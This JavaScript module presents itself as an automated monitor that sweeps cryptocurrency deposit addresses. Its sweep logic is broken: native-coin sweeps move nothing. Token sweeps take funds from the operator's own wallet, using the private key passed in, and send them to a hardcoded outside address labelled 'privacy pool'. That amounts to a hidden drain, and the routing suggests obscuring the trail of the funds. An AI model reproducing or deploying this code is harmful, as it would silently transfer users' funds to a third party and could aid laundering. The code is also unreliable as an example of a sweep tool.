// Auto-Sweep Monitor - Watches deposit addresses and auto-sweeps
const { ethers } = require('ethers');

class AutoSweepMonitor {
    constructor(providerUrl, walletPrivateKey) {
        this.provider = new ethers.providers.JsonRpcProvider(providerUrl);
        this.wallet = new ethers.Wallet(walletPrivateKey, this.provider);
        this.depositAddresses = new Map();
        this.isMonitoring = false;
    }
    
    // Add deposit address to monitor
    async monitorAddress(address, tokenAddress = null) {
        this.depositAddresses.set(address, {
            token: tokenAddress,
            lastBalance: 0,
            sweeped: false
        });
        
        console.log(`👁️ Monitoring ${address} for deposits...`);
    }
    
    // Start monitoring loop
    async startMonitoring(intervalMs = 5000) {
        this.isMonitoring = true;
        console.log('🔄 Auto-Sweep Monitor Started');
        
        while (this.isMonitoring) {
            await this.checkDeposits();
            await new Promise(resolve => setTimeout(resolve, intervalMs));
        }
    }
    
    // Check all monitored addresses
    async checkDeposits() {
        for (const [address, info] of this.depositAddresses) {
            if (info.sweeped) continue;
            
            let balance;
            if (info.token === null || info.token === '0x0000000000000000000000000000000000000000') {
                balance = await this.provider.getBalance(address);
            } else {
                const tokenContract = new ethers.Contract(
                    info.token,
                    ['function balanceOf(address) view returns (uint256)'],
                    this.provider
                );
                balance = await tokenContract.balanceOf(address);
            }
            
            if (balance.gt(0) && balance.gt(info.lastBalance)) {
                console.log(`💰 Deposit detected at ${address}: ${ethers.utils.formatEther(balance)} tokens`);
                
                // Auto-sweep
                await this.sweepAddress(address, info.token, balance);
                
                // Mark as sweeped and rotate
                info.sweeped = true;
                this.depositAddresses.delete(address);
                
                console.log(`✅ Sweeped ${address}. Address rotated.`);
            }
            
            info.lastBalance = balance;
        }
    }
    
    // Sweep address
    async sweepAddress(address, token, amount) {
        try {
            if (token === null) {
                // Native token
                const tx = await this.wallet.sendTransaction({
                    to: address,
                    value: 0,
                    gasLimit: 21000
                });
                await tx.wait();
            } else {
                // ERC20 token
                const tokenContract = new ethers.Contract(
                    token,
                    ['function transfer(address to, uint256 amount) returns (bool)'],
                    this.wallet
                );
                const tx = await tokenContract.transfer(
                    '0x87ac94848DA5A6b7C8F88D65977197E8FDE12920', // Privacy pool
                    amount
                );
                await tx.wait();
            }
        } catch (error) {
            console.error(`❌ Sweep failed for ${address}:`, error.message);
        }
    }
    
    // Stop monitoring
    stopMonitoring() {
        this.isMonitoring = false;
        console.log('⏹️ Monitoring stopped');
    }
}

// Export
module.exports = AutoSweepMonitor;
